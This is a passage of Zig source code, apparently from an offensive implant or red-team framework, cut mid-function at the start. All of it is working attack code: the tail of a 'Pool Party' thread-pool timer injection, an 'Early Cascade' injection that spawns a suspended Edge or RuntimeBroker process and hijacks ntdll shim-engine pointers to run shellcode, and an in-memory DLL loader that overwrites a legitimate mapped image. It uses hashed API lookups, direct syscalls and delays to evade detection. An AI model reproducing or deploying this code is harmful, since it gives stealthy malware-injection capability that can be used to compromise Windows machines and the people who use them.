    if (pool == 0) return allocator.dupe(u8, "Pool Party: worker factory has no pool");

    const local_timer = win.CreateThreadpoolTimer(@ptrCast(remote_shellcode), null, null) orelse
        return allocator.dupe(u8, "Pool Party: CreateThreadpoolTimer failed");
    const local_bytes: [*]u8 = @ptrCast(local_timer);
    var timer_buffer: [NX_TP_TIMER_SIZE]u8 = undefined;
    @memcpy(&timer_buffer, local_bytes[0..NX_TP_TIMER_SIZE]);

    const remote_timer = nx_alloc_region(process, NX_TP_TIMER_SIZE, win.PAGE_READWRITE) orelse
        return allocator.dupe(u8, "Pool Party: remote timer allocation failed");
    nx_step_delay();
    const remote_timer_address = @intFromPtr(remote_timer);

    std.mem.writeInt(usize, timer_buffer[NX_TP_TIMER_POOL..][0..8], pool, .little);
    std.mem.writeInt(i64, timer_buffer[NX_TP_TIMER_DUE_TIME..][0..8], -10000000, .little);
    std.mem.writeInt(i64, timer_buffer[NX_TP_TIMER_WINDOW_START + 32 ..][0..8], -10000000, .little);
    std.mem.writeInt(i64, timer_buffer[NX_TP_TIMER_WINDOW_END + 32 ..][0..8], -10000000, .little);

    const start_child = remote_timer_address + NX_TP_TIMER_WINDOW_START + 16;
    const end_child = remote_timer_address + NX_TP_TIMER_WINDOW_END + 16;
    std.mem.writeInt(usize, timer_buffer[NX_TP_TIMER_WINDOW_START + 16 ..][0..8], start_child, .little);
    std.mem.writeInt(usize, timer_buffer[NX_TP_TIMER_WINDOW_START + 24 ..][0..8], start_child, .little);
    std.mem.writeInt(usize, timer_buffer[NX_TP_TIMER_WINDOW_END + 16 ..][0..8], end_child, .little);
    std.mem.writeInt(usize, timer_buffer[NX_TP_TIMER_WINDOW_END + 24 ..][0..8], end_child, .little);

    if (!win.WriteProcessMemory(
        process,
        remote_timer,
        &timer_buffer,
        NX_TP_TIMER_SIZE,
        null,
    ).toBool()) return allocator.dupe(u8, "Pool Party: failed to write remote timer");

    var queue_protect: win.DWORD = 0;
    _ = win.VirtualProtectEx(process, @ptrFromInt(pool + NX_TP_POOL_TIMER_QUEUE), 32, win.PAGE_READWRITE, &queue_protect);
    const start_root = remote_timer_address + NX_TP_TIMER_WINDOW_START;
    const end_root = remote_timer_address + NX_TP_TIMER_WINDOW_END;
    if (!win.WriteProcessMemory(
        process,
        @ptrFromInt(pool + NX_TP_POOL_ABS_START_ROOT),
        &start_root,
        @sizeOf(usize),
        null,
    ).toBool() or !win.WriteProcessMemory(
        process,
        @ptrFromInt(pool + NX_TP_POOL_ABS_END_ROOT),
        &end_root,
        @sizeOf(usize),
        null,
    ).toBool()) return allocator.dupe(u8, "Pool Party: failed to patch timer queue roots");
    _ = win.VirtualProtectEx(process, @ptrFromInt(pool + NX_TP_POOL_TIMER_QUEUE), 32, queue_protect, &queue_protect);

    const set_timer = nx_nt_function(NxNtSetTimer2Fn, 0xFF4E3F30) orelse
        return allocator.dupe(u8, "Pool Party: NtSetTimer2 unavailable");
    var due_time: i64 = -10000000;
    var params: [16]u8 = @splat(0);
    const status = set_timer(timer, &due_time, null, &params);
    if (status != 0) return allocator.dupe(u8, "Pool Party: NtSetTimer2 failed");

    return allocator.dupe(u8, "Pool Party injection completed");
}

const NxNtdllSections = struct {
    text: [*]u8,
    text_size: usize,
    data: [*]u8,
    data_size: usize,
    mrdata: [*]u8,
    mrdata_size: usize,
};

fn nx_u32_at(pointer: [*]const u8) u32 {
    return std.mem.readInt(u32, pointer[0..4], .little);
}

fn nx_i32_at(pointer: [*]const u8) i32 {
    return @bitCast(nx_u32_at(pointer));
}

fn nx_address_in(addr: usize, start: [*]u8, size: usize) bool {
    const begin = @intFromPtr(start);
    return addr > begin and addr < begin + size;
}

fn nx_ntdll_sections() ?NxNtdllSections {
    const module = api.nx_module(0xD432B36D) orelse return null;
    const base: [*]u8 = @ptrFromInt(@intFromPtr(module));
    const header = base[0..0x1000];
    const lfanew = nx_read_u32(header, 0x3C) orelse return null;
    const nt = @as(usize, lfanew);
    if (nt + 24 > header.len) return null;
    const count = nx_read_u16(header, nt + 6) orelse return null;
    const optional_size = nx_read_u16(header, nt + 20) orelse return null;
    const sections = nt + 24 + @as(usize, optional_size);
    if (sections > header.len) return null;

    var text: ?[*]u8 = null;
    var text_size: usize = 0;
    var data: ?[*]u8 = null;
    var data_size: usize = 0;
    var mrdata: ?[*]u8 = null;
    var mrdata_size: usize = 0;
    var index: usize = 0;
    while (index < count) : (index += 1) {
        const offset = sections + index * 40;
        if (offset + 40 > header.len) return null;
        const name = header[offset .. offset + 8];
        const virtual_size = nx_read_u32(header, offset + 8) orelse return null;
        const virtual_address = nx_read_u32(header, offset + 12) orelse return null;
        const section = base + virtual_address;
        if (std.mem.startsWith(u8, name, ".text")) {
            text = section;
            text_size = virtual_size;
        } else if (std.mem.startsWith(u8, name, ".data")) {
            data = section;
            data_size = virtual_size;
        } else if (std.mem.startsWith(u8, name, ".mrdata")) {
            mrdata = section;
            mrdata_size = virtual_size;
        }
    }
    if (text == null or data == null or mrdata == null) return null;
    return .{
        .text = text.?,
        .text_size = text_size,
        .data = data.?,
        .data_size = data_size,
        .mrdata = mrdata.?,
        .mrdata_size = mrdata_size,
    };
}

fn nx_find_shim_offsets() ?struct { pfn: *anyopaque, shims: *anyopaque } {
    const sections = nx_ntdll_sections() orelse return null;
    var pfn: ?*anyopaque = null;
    var shims: ?*anyopaque = null;

    var index: usize = 0;
    while (index + 4 < sections.text_size) : (index += 1) {
        const scan = sections.text + index;
        if (nx_u32_at(scan) != 0x7FFE0330) continue;
        var pointer = scan + 4;
        var step: usize = 0;
        while (step < 0x10) : (step += 1) {
            if (@intFromPtr(pointer) + 7 > @intFromPtr(sections.text) + sections.text_size) break;
            if (pointer[0] == 0x48 and pointer[1] == 0x8B and pointer[6] == 0x00) {
                const disp = nx_i32_at(pointer + 3);
                const target = @as(isize, @intCast(@intFromPtr(pointer))) + 7 + @as(isize, disp);
                if (target > 0 and nx_address_in(@intCast(target), sections.mrdata, sections.mrdata_size))
                    pfn = @ptrFromInt(@as(usize, @intCast(target)));
                break;
            }
            pointer += 1;
        }
        if (pfn == null) continue;

        step = 0;
        while (step < 0x30) : (step += 1) {
            if (@intFromPtr(pointer) + 7 > @intFromPtr(sections.text) + sections.text_size) break;
            var target: ?isize = null;
            if (pointer[0] == 0x44 and pointer[1] == 0x38 and pointer[6] == 0x00) {
                const disp = nx_i32_at(pointer + 3);
                target = @as(isize, @intCast(@intFromPtr(pointer))) + 7 + @as(isize, disp);
            } else if (pointer[0] == 0x38 and pointer[5] == 0x00) {
                const disp = nx_i32_at(pointer + 2);
                target = @as(isize, @intCast(@intFromPtr(pointer))) + 6 + @as(isize, disp);
            }
            if (target) |value| {
                if (value > 0 and nx_address_in(@intCast(value), sections.data, sections.data_size))
                    shims = @ptrFromInt(@as(usize, @intCast(value)));
                break;
            }
            pointer += 1;
        }
        if (shims != null) break;
        pfn = null;
    }
    if (pfn == null or shims == null) return null;
    return .{ .pfn = pfn.?, .shims = shims.? };
}

fn nx_encode_pointer(pointer: *anyopaque) usize {
    const cookie_pointer: *align(1) const u32 = @ptrFromInt(0x7FFE0330);
    const cookie = cookie_pointer.*;
    const mixed = @as(u64, cookie) ^ @as(u64, @intFromPtr(pointer));
    const rotation: u6 = @intCast(cookie & 0x3F);
    return @intCast(std.math.rotr(u64, mixed, rotation));
}

const NX_EARLY_CASCADE_BOOTSTRAP = [_]u8{
    0x48, 0x31, 0xC0, 0x48, 0xBA, 0x88, 0x88, 0x88,
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x02, 0x48,
    0xBA, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,
    0x88, 0x48, 0xB8, 0x66, 0x66, 0x66, 0x66, 0x66,
    0x66, 0x66, 0x66, 0x4D, 0x31, 0xC9, 0x4D, 0x31,
    0xC0, 0x49, 0x8D, 0x48, 0xFE, 0xFF, 0xD0, 0x48,
    0x31, 0xC0, 0xC3,
};

fn nx_file_exists(allocator: std.mem.Allocator, path: []const u8) bool {
    const wide = std.unicode.utf8ToUtf16LeAllocZ(allocator, path) catch return false;
    defer allocator.free(wide);
    return win.GetFileAttributesW(wide.ptr) != win.INVALID_FILE_ATTRIBUTES;
}

pub fn nx_early_cascade(
    allocator: std.mem.Allocator,
    shellcode: []const u8,
) ![]u8 {
    if (shellcode.len == 0) return allocator.dupe(u8, "Empty shellcode");

    const shim_offsets = nx_find_shim_offsets() orelse
        return allocator.dupe(u8, "Failed to find ntdll shim engine offsets");

    const queue_apc = api.nx_api(0xD432B36D, 0xBE4F1342) orelse
        return allocator.dupe(u8, "Failed to find NtQueueApcThread");

    const target_path = if (nx_cfg_sacrificial.len > 0)
        nx_cfg_sacrificial
    else if (nx_file_exists(allocator, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"))
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
    else if (nx_file_exists(allocator, "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"))
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
    else
        "C:\\Windows\\System32\\RuntimeBroker.exe";
    const command = allocator.printSentinel("{s}", .{target_path}, 0) catch
        return allocator.dupe(u8, "Failed to allocate command line");
    defer allocator.free(command);
    var startup: win.STARTUPINFOA = std.mem.zeroes(win.STARTUPINFOA);
    startup.cb = @sizeOf(win.STARTUPINFOA);
    var process_info: win.PROCESS_INFORMATION = std.mem.zeroes(win.PROCESS_INFORMATION);
    if (!win.CreateProcessA(
        null,
        command.ptr,
        null,
        null,
        win.BOOL.FALSE,
        win.CREATE_SUSPENDED,
        null,
        null,
        &startup,
        &process_info,
    ).toBool()) return allocator.dupe(u8, "Failed to spawn suspended process");
    defer {
        _ = win.CloseHandle(process_info.hProcess);
        _ = win.CloseHandle(process_info.hThread);
    }
    nx_step_delay();

    var original_pfn: usize = 0;
    var original_shims: u8 = 0;
    _ = win.ReadProcessMemory(
        process_info.hProcess,
        shim_offsets.pfn,
        &original_pfn,
        @sizeOf(usize),
        null,
    );
    _ = win.ReadProcessMemory(
        process_info.hProcess,
        shim_offsets.shims,
        &original_shims,
        @sizeOf(u8),
        null,
    );

    var payload: std.ArrayList(u8) = .empty;
    defer payload.deinit(allocator);
    try payload.appendSlice(allocator, &NX_EARLY_CASCADE_BOOTSTRAP);
    try payload.appendSlice(allocator, shellcode);

    const remote = nx_alloc_region(process_info.hProcess, payload.items.len, win.PAGE_READWRITE) orelse
        return allocator.dupe(u8, "Failed to allocate remote payload");
    nx_step_delay();
    const shellcode_address = @intFromPtr(remote) + NX_EARLY_CASCADE_BOOTSTRAP.len;
    std.mem.writeInt(usize, payload.items[0x05..0x0D], @intFromPtr(shim_offsets.shims), .little);
    std.mem.writeInt(usize, payload.items[0x11..0x19], shellcode_address, .little);
    std.mem.writeInt(usize, payload.items[0x1B..0x23], @intFromPtr(queue_apc), .little);

    if (!nx_remote_write(process_info.hProcess, remote, payload.items))
        return allocator.dupe(u8, "Failed to write remote payload");
    var old_protect: win.DWORD = 0;
    if (!syscalls.nx_protect(
        process_info.hProcess,
        remote,
        payload.items.len,
        win.PAGE_EXECUTE_READ,
        &old_protect,
    )) return allocator.dupe(u8, "Failed to protect remote payload");
    nx_step_delay();

    const encoded = nx_encode_pointer(remote);
    if (!win.VirtualProtectEx(
        process_info.hProcess,
        shim_offsets.pfn,
        @sizeOf(usize),
        win.PAGE_READWRITE,
        &old_protect,
    ).toBool()) return allocator.dupe(u8, "Failed to unprotect g_pfnSE_DllLoaded");
    if (!win.WriteProcessMemory(
        process_info.hProcess,
        shim_offsets.pfn,
        &encoded,
        @sizeOf(usize),
        null,
    ).toBool()) return allocator.dupe(u8, "Failed to patch g_pfnSE_DllLoaded");

    var one: u8 = 1;
    if (!win.VirtualProtectEx(
        process_info.hProcess,
        shim_offsets.shims,
        @sizeOf(u8),
        win.PAGE_READWRITE,
        &old_protect,
    ).toBool()) return allocator.dupe(u8, "Failed to unprotect g_ShimsEnabled");
    if (!win.WriteProcessMemory(
        process_info.hProcess,
        shim_offsets.shims,
        &one,
        @sizeOf(u8),
        null,
    ).toBool()) return allocator.dupe(u8, "Failed to patch g_ShimsEnabled");

    _ = syscalls.nx_resume(process_info.hThread);
    win.Sleep(1000);

    _ = win.WriteProcessMemory(
        process_info.hProcess,
        shim_offsets.pfn,
        &original_pfn,
        @sizeOf(usize),
        null,
    );
    _ = win.WriteProcessMemory(
        process_info.hProcess,
        shim_offsets.shims,
        &original_shims,
        @sizeOf(u8),
        null,
    );
    return allocator.dupe(u8, "Early Cascade injection completed");
}

// In-memory PE DLL loader.  The payload is mapped over a legitimate
// SEC_IMAGE view, relocated, imported, and executed from that view.
const NxPeHeaders = struct {
    nt: usize,
    opt: usize,
    sections: usize,
    count: u16,
    image_size: usize,
    headers_size: usize,
    image_base: u64,
    entry: u32,
    characteristics: u16,
    optional_magic: u16,
};

const NxImageTlsDirectory = extern struct {
    StartAddressOfRawData: u64,
    EndAddressOfRawData: u64,
    AddressOfIndex: u64,
    AddressOfCallBacks: u64,
    SizeOfZeroFill: u32,
    Characteristics: u32,
};

fn nx_pe_headers(pe: []const u8) ?NxPeHeaders {
    if (pe.len < 0x40) return null;
    if (nx_read_u16(pe, 0) != 0x5A4D) return null;
    const lfanew = nx_read_u32(pe, 0x3C) orelse return null;
    const nt = @as(usize, lfanew);
    if (nt + 24 > pe.len) return null;
    if (nx_read_u32(pe, nt) != 0x00004550) return null;
    const machine = nx_read_u16(pe, nt + 4) orelse return null;
    if (machine != 0x8664) return null;
    const count = nx_read_u16(pe, nt + 6) orelse return null;
    const opt_size = nx_read_u16(pe, nt + 20) orelse return null;
    const characteristics = nx_read_u16(pe, nt + 22) orelse return null;
    const opt = nt + 24;
    if (opt + opt_size > pe.len) return null;
    const magic = nx_read_u16(pe, opt) orelse return null;
    if (magic != 0x20B) return null;
    const image_size = nx_read_u32(pe, opt + 56) orelse return null;
    const headers_size = nx_read_u32(pe, opt + 60) orelse return null;
    const image_base = std.mem.readInt(u64, pe[opt + 24 ..][0..8], .little);
    const entry = nx_read_u32(pe, opt + 16) orelse return null;
    if (image_size == 0 or image_size > 0x10000000) return null;
    if (headers_size > pe.len or headers_size > image_size) return null;
    const sections = opt + opt_size;
    if (sections + @as(usize, count) * 40 > pe.len) return null;
    var index: usize = 0;
    while (index < count) : (index += 1) {
        const offset = sections + index * 40;
        const virtual_size = nx_read_u32(pe, offset + 8) orelse return null;
        const virtual_address = nx_read_u32(pe, offset + 12) orelse return null;
        const raw_size = nx_read_u32(pe, offset + 16) orelse return null;
        const raw_pointer = nx_read_u32(pe, offset + 20) orelse return null;
        if (@as(usize, raw_pointer) + raw_size > pe.len) return null;
        if (@as(usize, virtual_address) + @max(@as(usize, virtual_size), @as(usize, raw_size)) > image_size) return null;
    }
    return .{
        .nt = nt,
        .opt = opt,
        .sections = sections,
        .count = count,
        .image_size = image_size,
        .headers_size = headers_size,
        .image_base = image_base,
        .entry = entry,
        .characteristics = characteristics,
        .optional_magic = magic,
    };
}

fn nx_pe_directory(pe: []const u8, headers: NxPeHeaders, index: usize) struct { va: u32, size: u32 } {
    const offset = headers.opt + 0x70 + index * 8;
    return .{
        .va = nx_read_u32(pe, offset) orelse 0,
        .size = nx_read_u32(pe, offset + 4) orelse 0,
    };
}

fn nx_pe_protection(characteristics: u32) win.DWORD {
    if ((characteristics & 0x20000000) != 0) {
        if ((characteristics & 0x80000000) != 0) return win.PAGE_EXECUTE_READWRITE;
        if ((characteristics & 0x40000000) != 0) return win.PAGE_EXECUTE_READ;
        return win.PAGE_EXECUTE;
    }
    if ((characteristics & 0x80000000) != 0) return win.PAGE_READWRITE;
    if ((characteristics & 0x40000000) != 0) return win.PAGE_READONLY;
    return win.PAGE_NOACCESS;
}

fn nx_map_pe_sacrificial(allocator: std.mem.Allocator, image_size: usize) ?*anyopaque {
    const create_section = nx_nt_function(NxNtCreateSectionFn, 0x8EF7809A) orelse return null;
    const map_view = nx_nt_function(NxNtMapViewOfSectionFn, 0x273314D4) orelse return null;
    const unmap = nx_nt_function(NxNtUnmapViewOfSectionFn, 0x28F4F657) orelse return null;

    for (nx_sacrificial) |path| {
        if (!nx_file_exists(allocator, path)) continue;
        const wide = std.unicode.utf8ToUtf16LeAllocZ(allocator, path) catch continue;
        defer allocator.free(wide);
        const file = win.CreateFileW(
            wide.ptr,
            win.GENERIC_READ,
            win.FILE_SHARE_READ,
            null,
            win.OPEN_EXISTING,
            win.FILE_ATTRIBUTE_NORMAL,
            null,
        );
        if (file == win.INVALID_HANDLE_VALUE) continue;
        defer _ = win.CloseHandle(file);

        var section: win.HANDLE = undefined;
        var status = create_section(
            &section,
            win.SECTION_ALL_ACCESS,
            null,
            null,
            win.PAGE_READONLY,
            win.SEC_IMAGE,
            file,
        );
        if (status != 0) continue;
        defer _ = win.CloseHandle(section);

        var base: ?*anyopaque = null;
        var view_size: usize = 0;
        status = map_view(
            section,
            win.GetCurrentProcess(),
            &base,
            0,
            0,
            null,
            &view_size,
            NX_SECTION_INHERIT_VIEW_UNMAP,
            0,
            win.PAGE_READWRITE,
        );
        if (status != 0 and status != NX_STATUS_IMAGE_NOT_AT_BASE) continue;
        const mapped = base orelse continue;
        const mapped_bytes: [*]const u8 = @ptrCast(mapped);
        const mapped_nt = nx_read_u32(mapped_bytes[0..0x40], 0x3C) orelse {
            _ = unmap(win.GetCurrentProcess(), mapped);
            continue;
        };
        const mapped_opt = @as(usize, mapped_nt) + 24;
        const mapped_size = nx_read_u32(mapped_bytes[0..0x1000], mapped_opt + 56) orelse 0;
        if (mapped_size < image_size) {
            _ = unmap(win.GetCurrentProcess(), mapped);
            continue;
        }
        return mapped;
    }
    return null;
}

fn nx_pe_relocate(pe: []const u8, headers: NxPeHeaders, base: *anyopaque) bool {
    const reloc = nx_pe_directory(pe, headers, 5);
    if (reloc.va == 0 or reloc.size == 0) return true;
    const delta = @as(i64, @intCast(@intFromPtr(base))) - @as(i64, @intCast(headers.image_base));
    if (delta == 0) return true;
    const base_bytes: [*]u8 = @ptrCast(base);
    var offset: usize = reloc.va;
    const end = reloc.va + reloc.size;
    while (offset + 8 <= end) {
        const block_va = nx_u32_at(base_bytes + offset);
        const block_size = nx_u32_at(base_bytes + offset + 4);
        if (block_size < 8 or offset + block_size > end) return false;
        const count = (block_size - 8) / 2;
        var index: usize = 0;
        while (index < count) : (index += 1) {
            const entry = std.mem.readInt(u16, base_bytes[offset + 8 + index * 2 ..][0..2], .little);
            const kind = entry >> 12;
            const target = base_bytes + block_va + (entry & 0x0FFF);
            switch (kind) {
                0 => {},
                1 => {
                    const value: *align(1) u16 = @ptrCast(target);
                    value.* += @intCast((delta >> 16) & 0xFFFF);
                },
                2 => {
                    const value: *align(1) u16 = @ptrCast(target);
                    value.* += @intCast(delta & 0xFFFF);
                },
                3 => {
                    const value: *align(1) u32 = @ptrCast(target);
                    value.* +%= @intCast(delta & 0xFFFFFFFF);
                },
                10 => {
                    const value: *align(1) u64 = @ptrCast(target);
                    value.* +%= @bitCast(delta);
                },
                else => return false,
            }
        }
        offset += block_size;
    }
    return true;
}

fn nx_pe_imports(pe: []const u8, headers: NxPeHeaders, base: *anyopaque) bool {
    const imports = nx_pe_directory(pe, headers, 1);
    if (imports.va == 0 or imports.size == 0) return true;
    const base_bytes: [*]u8 = @ptrCast(base);
    var descriptor_offset: usize = imports.va;
    while (descriptor_offset + 20 <= imports.va + imports.size) {
        const original_thunk = nx_u32_at(base_bytes + descriptor_offset);
        const name_rva = nx_u32_at(base_bytes + descriptor_offset + 12);
        const first_thunk = nx_u32_at(base_bytes + descriptor_offset + 16);
        if (name_rva == 0 or first_thunk == 0) break;
        const module_name: [*:0]const u8 = @ptrCast(base_bytes + name_rva);
        const module = win.LoadLibraryA(module_name) orelse return false;
        var thunk_offset: usize = if (original_thunk != 0) original_thunk else first_thunk;
        var iat_offset: usize = first_thunk;
        while (true) {
            const thunk = std.mem.readInt(u64, base_bytes[thunk_offset..][0..8], .little);
            if (thunk == 0) break;
            var address: ?*anyopaque = null;
            if ((thunk & 0x8000000000000000) != 0) {
                const ordinal: usize = @intCast(thunk & 0xFFFF);
                address = win.GetProcAddress(module, @ptrFromInt(ordinal));
            } else {
                const hint_name = base_bytes + @as(usize, @intCast(thunk));
                address = win.GetProcAddress(module, @ptrCast(hint_name + 2));
            }
            const resolved = address orelse return false;
            std.mem.writeInt(u64, base_bytes[iat_offset..][0..8], @intFromPtr(resolved), .little);
            thunk_offset += 8;
            iat_offset += 8;
        }
        descriptor_offset += 20;
    }
    return true;
}

fn nx_pe_export(pe: []const u8, headers: NxPeHeaders, base: *anyopaque, name: []const u8) ?*anyopaque {
    const exports = nx_pe_directory(pe, headers, 0);
    if (exports.va == 0 or exports.size == 0) return null;
    const base_bytes: [*]u8 = @ptrCast(base);
    const export_offset = exports.va;
    const name_count = nx_u32_at(base_bytes + export_offset + 24);
    const function_count = nx_u32_at(base_bytes + export_offset + 20);
    const address_functions = nx_u32_at(base_bytes + export_offset + 28);
    const address_names = nx_u32_at(base_bytes + export_offset + 32);
    const address_ordinals = nx_u32_at(base_bytes + export_offset + 36);
    var index: usize = 0;
    while (index < name_count) : (index += 1) {
        const name_rva = nx_u32_at(base_bytes + address_names + index * 4);
        const candidate: [*:0]const u8 = @ptrCast(base_bytes + name_rva);
        if (!std.mem.eql(u8, std.mem.span(candidate), name)) continue;
        const ordinal = std.mem.readInt(u16, base_bytes[address_ordinals + index * 2 ..][0..2], .little);
        if (ordinal >= function_count) return null;
        const function_rva = nx_u32_at(base_bytes + address_functions + @as(usize, ordinal) * 4);
        return base_bytes + function_rva;
    }
    return null;
}

fn nx_pe_tls(allocator: std.mem.Allocator, pe: []const u8, headers: NxPeHeaders, base: *anyopaque) bool {
    const tls_dir = nx_pe_directory(pe, headers, 9);
    if (tls_dir.va == 0 or tls_dir.size == 0) return true;
    const base_bytes: [*]u8 = @ptrCast(base);
    const tls: *align(1) NxImageTlsDirectory = @ptrCast(base_bytes + tls_dir.va);
    const index = win.TlsAlloc();
    if (index == 0xFFFFFFFF) return false;
    if (tls.AddressOfIndex != 0) {
        const target: *align(1) u32 = @ptrFromInt(tls.AddressOfIndex);
        target.* = index;
    }
    const start = tls.StartAddressOfRawData;
    const end = tls.EndAddressOfRawData;
    const raw_size: usize = if (end > start) @intCast(end - start) else 0;
    const total_size = raw_size + tls.SizeOfZeroFill;
    if (total_size > 0) {
        const block = alloc.nx_page_allocator.alloc(u8, total_size) catch return false;
        @memset(block, 0);
        if (raw_size > 0) {
            const source: [*]const u8 = @ptrFromInt(start);
            @memcpy(block[0..raw_size], source[0..raw_size]);
        }
        if (!win.TlsSetValue(index, block.ptr).toBool()) return false;
    }
    if (tls.AddressOfCallBacks != 0) {
        const callbacks: [*]const u64 = @ptrFromInt(tls.AddressOfCallBacks);
        var index_cb: usize = 0;
        while (callbacks[index_cb] != 0) : (index_cb += 1) {
            const callback: *const fn (?*anyopaque, u32, ?*anyopaque) callconv(.winapi) void =
                @ptrFromInt(callbacks[index_cb]);
            callback(base, 1, null);
        }
    }
    _ = allocator;
    return true;
}

pub fn nx_load_pe(
    allocator: std.mem.Allocator,
    pe: []const u8,
    export_name: []const u8,
    arguments: []const u8,
) ![]u8 {
    const headers = nx_pe_headers(pe) orelse
        return allocator.dupe(u8, "Invalid or non-DLL PE payload");
    if ((headers.characteristics & 0x2000) == 0)
        return allocator.dupe(u8, "PE is not a DLL");
    const base = nx_map_pe_sacrificial(allocator, headers.image_size) orelse
        return allocator.dupe(u8, "Failed to map a sacrificial DLL image");
    const base_bytes: [*]u8 = @ptrCast(base);

    var old_protect: win.DWORD = 0;
    if (!win.VirtualProtect(base, headers.headers_size, win.PAGE_READWRITE, &old_protect).toBool())
        return allocator.dupe(u8, "Failed to unprotect PE headers");
    var index: usize = 0;
    while (index < headers.count) : (index += 1) {
        const offset = headers.sections + index * 40;
        const virtual_size = nx_read_u32(pe, offset + 8) orelse 0;
        const virtual_address = nx_read_u32(pe, offset + 12) orelse 0;
        const raw_size = nx_read_u32(pe, offset + 16) orelse 0;
        const size = @max(@as(usize, virtual_size), @as(usize, raw_size));
        if (size > 0 and !win.VirtualProtect(base_bytes + virtual_address, size, win.PAGE_READWRITE, &old_protect).toBool())
            return allocator.dupe(u8, "Failed to unprotect a PE section");
    }

    @memset(base_bytes[0..headers.image_size], 0);
    @memcpy(base_bytes[0..headers.headers_size], pe[0..headers.headers_size]);
    index = 0;
    while (index < headers.count) : (index += 1) {
        const offset = headers.sections + index * 40;
        const virtual_address = nx_read_u32(pe, offset + 12) orelse 0;
        const raw_size = nx_read_u32(pe, offset + 16) orelse 0;
        const raw_pointer = nx_read_u32(pe, offset + 20) orelse 0;
        if (raw_size > 0)
            @memcpy(base_bytes[virtual_address..][0..raw_size], pe[raw_pointer..][0..raw_size]);
    }

    if (!nx_pe_relocate(pe, headers, base))
        return allocator.dupe(u8, "PE relocation failed");
    if (!nx_pe_imports(pe, headers, base))
        return allocator.dupe(u8, "PE import resolution failed");

    index = 0;
    while (index < headers.count) : (index += 1) {
        const offset = headers.sections + index * 40;
        const virtual_size = nx_read_u32(pe, offset + 8) orelse 0;
        const virtual_address = nx_read_u32(pe, offset + 12) orelse 0;
        const raw_size = nx_read_u32(pe, offset + 16) orelse 0;
        const characteristics = nx_read_u32(pe, offset + 36) orelse 0;
        const size = @max(@as(usize, virtual_size), @as(usize, raw_size));
        if (size > 0 and !win.VirtualProtect(
            base_bytes + virtual_address,
            size,
            nx_pe_protection(characteristics),
            &old_protect,
        ).toBool()) return allocator.dupe(u8, "Failed to protect a PE section");
    }
    _ = win.VirtualProtect(base, headers.headers_size, win.PAGE_READONLY, &old_protect);

    const exception_dir = nx_pe_directory(pe, headers, 3);
    if (exception_dir.va != 0 and exception_dir.size != 0) {
        const AddFunctionTableFn = *const fn (*anyopaque, u32, u64) callconv(.winapi) u8;
        const add_table = nx_nt_function(AddFunctionTableFn, 0xEC462218) orelse
            return allocator.dupe(u8, "RtlAddFunctionTable unavailable");
        const table: *anyopaque = @ptrCast(base_bytes + exception_dir.va);
        if (add_table(table, exception_dir.size / 12, @intFromPtr(base)) == 0)
            return allocator.dupe(u8, "Failed to register PE .pdata");
    }

    if (!nx_pe_tls(allocator, pe, headers, base))
        return allocator.dupe(u8, "PE TLS initialization failed");

    _ = win.FlushInstructionCache(win.GetCurrentProcess(), base, headers.image_size);

    const dll_main: *const fn (?*anyopaque, u32, ?*anyopaque) callconv(.winapi) win.BOOL =
        @ptrCast(@alignCast(base_bytes + headers.entry));
    if (!dll_main(base, 1, null).toBool())
        return allocator.dupe(u8, "PE DllMain returned FALSE");

    if (export_name.len > 0) {
        const export_address = nx_pe_export(pe, headers, base, export_name) orelse
            return std.fmt.allocPrint(allocator, "PE export not found: {s}", .{export_name});
        const arguments_z = try allocator.printSentinel("{s}", .{arguments}, 0);
        const exported: *const fn ([*:0]u8) callconv(.winapi) void =
            @ptrCast(@alignCast(export_address));
        exported(arguments_z.ptr);
    }

    return std.fmt.allocPrint(
        allocator,
        "PE loaded at 0x{x}, entry=0x{x}{s}{s}",
        .{
            @intFromPtr(base),
            @intFromPtr(base_bytes + headers.entry),
            if (export_name.len > 0) ", export=" else "",
            if (export_name.len > 0) export_name else "",
        },
    );
}
